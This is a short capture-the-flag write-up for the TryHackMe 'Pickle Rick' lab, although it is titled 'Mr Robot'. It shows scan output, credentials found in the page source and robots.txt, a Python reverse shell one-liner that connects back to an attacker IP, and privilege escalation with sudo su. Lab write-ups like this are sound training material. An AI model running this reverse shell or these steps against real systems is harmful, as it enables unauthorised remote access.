# Mr Robot  - Try Hack Me

Reference: [Pickle Rick](https://tryhackme.com/room/picklerick)

Level: Super Easy

---

Recognition:


```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks]
└─$ nmap -A 10.10.38.244                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-04 17:25 CET
Nmap scan report for 10.10.38.244
Host is up (0.029s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 eb:d0:16:31:19:da:93:e3:e9:9e:90:23:d3:1e:5b:cc (RSA)
|   256 b4:f6:94:1b:07:67:fc:cb:8a:37:d9:24:c8:6e:5b:57 (ECDSA)
|_  256 e6:b7:6e:2c:73:47:3e:58:32:5a:7f:91:ec:b6:b8:b3 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.74 seconds
```

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks]
└─$ nikto -url http://10.10.38.244/     
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.38.244
+ Target Hostname:    10.10.38.244
+ Target Port:        80
+ Start Time:         2024-01-04 17:27:03 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, GET, HEAD .
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /login.php: Admin login page/section found.
+ 8093 requests: 18 error(s) and 8 item(s) reported on remote host
+ End Time:           2024-01-04 17:38:07 (GMT1) (664 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks]
└─$ dirb http://10.10.38.244:80 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Jan  4 17:29:21 2024
URL_BASE: http://10.10.38.244:80/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.38.244:80/ ----
==> DIRECTORY: http://10.10.38.244:80/assets/                                                                        
+ http://10.10.38.244:80/index.html (CODE:200|SIZE:1062)                                                             
+ http://10.10.38.244:80/robots.txt (CODE:200|SIZE:17)                                                               
+ http://10.10.38.244:80/server-status (CODE:403|SIZE:300)                                                           
                                                                                                                     
---- Entering directory: http://10.10.38.244:80/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Thu Jan  4 17:34:06 2024
DOWNLOADED: 4612 - FOUND: 3
```

A website is living on port 80 lets connect to it. The enumeration allows us to detect a login page. We looking at the source code of the home page we can find the following username `R1ckRul3s`. Thanks to dirb we've found at /robots.txt a file containing: `Wubbalubbadubdub`. This is very likely to be login creditentials. When we login theres a command execution page. 

We will open a reverse shell using python3:

```py
export RHOST="10.9.168.4";export RPORT=4444;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

Once we're in we can gain priveleges with a `sudo su` command and then just browse the file system to find the ingredients.